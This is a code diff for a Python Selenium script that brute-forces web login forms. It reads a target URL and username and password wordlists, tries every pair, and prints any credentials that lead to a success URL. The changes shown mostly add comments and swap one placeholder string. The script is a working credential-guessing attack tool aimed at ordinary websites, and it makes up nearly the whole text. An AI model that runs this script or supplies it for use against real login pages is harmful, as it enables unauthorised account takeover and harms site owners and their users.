@@ -10,9 +10,11 @@ URL = input('[+] Enter Page URL: ')
 USERNAME_FILE = input('[+] Enter Username List: ')
 PASSWORD_FILE = input('[+] Enter Password List: ')
 
+# Initialize the WebDriver instance (Chrome in this case)
 def setup_driver():
     return webdriver.Chrome()
 
+# Locate and return login elements
 def find_login_elements(driver):
     driver.get(URL)
     username_field = WebDriverWait(driver, WAIT_TIME).until(
@@ -26,6 +28,7 @@ def find_login_elements(driver):
     )
     return username_field, password_field, login_button
 
+# Perform login attempt using provided username and password
 def attempt_login(username, password, driver):
     username_field, password_field, login_button = find_login_elements(driver)
     username_field.clear()
@@ -35,6 +38,7 @@ def attempt_login(username, password, driver):
     login_button.click()
     time.sleep(2)
 
+# Iterate through username and password lists and attempt to crack the login
 def cracking(username_list, password_list, driver):
     for username in username_list:
         for password in password_list:
@@ -44,14 +48,16 @@ def cracking(username_list, password_list, driver):
 
             attempt_login(username, password, driver)
 
-            # Replace '<login-url>' with your actual login URL
-            if '<login-url>' in driver.current_url:
+            # Replace '<success-login-url>' with your actual successful login URL
+            if '<success-login-url>' in driver.current_url:
+                # This line checks for a successful login based on the URL.
                 print(f'[+] Found Username: ==> {username}')
                 print(f'[+] Found Password: ==> {password}')
                 return True
 
     return False
 
+# Main function to run the script
 def main():
     driver = setup_driver()
     try:
